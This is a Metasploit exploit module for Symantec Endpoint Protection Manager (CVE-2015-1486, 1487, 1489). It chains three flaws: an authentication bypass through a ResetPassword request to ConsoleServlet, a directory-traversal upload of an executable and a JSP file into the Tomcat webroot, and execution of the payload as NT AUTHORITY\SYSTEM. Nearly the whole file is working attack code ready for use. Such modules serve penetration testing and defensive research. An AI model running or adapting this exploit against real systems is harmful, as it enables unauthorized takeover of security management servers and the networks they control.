# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Symantec Endpoint Protection Manager Authentication Bypass and Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits three separate vulnerabilities in Symantec Endpoint Protection Manager
        in order to achieve a remote shell on the box as NT AUTHORITY\SYSTEM. The vulnerabilities
        include an authentication bypass, a directory traversal and a privilege escalation to
        get privileged code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Markus Wulftange&#039;, #discovery
          &#039;bperry&#039; # metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-1486&#039;],
          [&#039;CVE&#039;, &#039;2015-1487&#039;],
          [&#039;CVE&#039;, &#039;2015-1489&#039;],
          [&#039;URL&#039;, &#039;http://codewhitesec.blogspot.com/2015/07/symantec-endpoint-protection.html&#039;]
        ],
      &#039;DefaultOptions&#039; => {
        &#039;SSL&#039; => true
      },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Payload&#039; => {
                &#039;DisableNops&#039; => true
              }
            }
          ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Jul 31 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(8443),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of the web application&#039;, &#039;/&#039;]),
        ], self.class)
  end

  def exploit
    meterp = Rex::Text.rand_text_alpha(10)
    jsp = Rex::Text.rand_text_alpha(10)

    print_status("#{peer} - Getting cookie...")

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;servlet&#039;, &#039;ConsoleServlet&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;ActionType&#039; => &#039;ResetPassword&#039;,
        &#039;UserID&#039; => &#039;admin&#039;,
        &#039;Domain&#039; => &#039;&#039;
      }
    })

    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{peer} - The server did not respond in an expected way")
    end

    cookie = res.get_cookies

    if cookie.nil? || cookie.empty?
      fail_with(Failure::Unknown, "#{peer} - The server did not return a cookie")
    end

    exec = %Q{<%@page import="java.io.*,java.util.*,com.sygate.scm.server.util.*"%>
<%=SemLaunchService.getInstance().execute("CommonCMD", Arrays.asList("/c", System.getProperty("user.dir")+"\\\\..\\\\webapps\\\\ROOT\\\\#{meterp}.exe")) %>
    }

    print_status("#{peer} - Uploading payload...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;servlet&#039;, &#039;ConsoleServlet&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => {
        &#039;ActionType&#039; => &#039;BinaryFile&#039;,
        &#039;Action&#039; => &#039;UploadPackage&#039;,
        &#039;PackageFile&#039; => "../../../tomcat/webapps/ROOT/#{meterp}.exe",
        &#039;KnownHosts&#039; => &#039;.&#039;
      },
      &#039;data&#039; => payload.encoded_exe,
      &#039;cookie&#039; => cookie,
      &#039;ctype&#039; => &#039;&#039;
    })

    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Server did not respond in an expected way")
    end

    register_file_for_cleanup("../tomcat/webapps/ROOT/#{meterp}.exe")

    print_status("#{peer} - Uploading JSP page to execute the payload...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;servlet&#039;, &#039;ConsoleServlet&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => {
        &#039;ActionType&#039; => &#039;BinaryFile&#039;,
        &#039;Action&#039; => &#039;UploadPackage&#039;,
        &#039;PackageFile&#039; => "../../../tomcat/webapps/ROOT/#{jsp}.jsp",
        &#039;KnownHosts&#039; => &#039;.&#039;
      },
      &#039;data&#039; => exec,
      &#039;cookie&#039; => cookie,
      &#039;ctype&#039; => &#039;&#039;
    })

    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Server did not respond in an expected way")
    end

    register_file_for_cleanup("../tomcat/webapps/ROOT/#{jsp}.jsp")

    print_status("#{peer} - Executing payload. Manual cleanup will be required.")
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "#{jsp}.jsp")
    }, 5)
  end
end

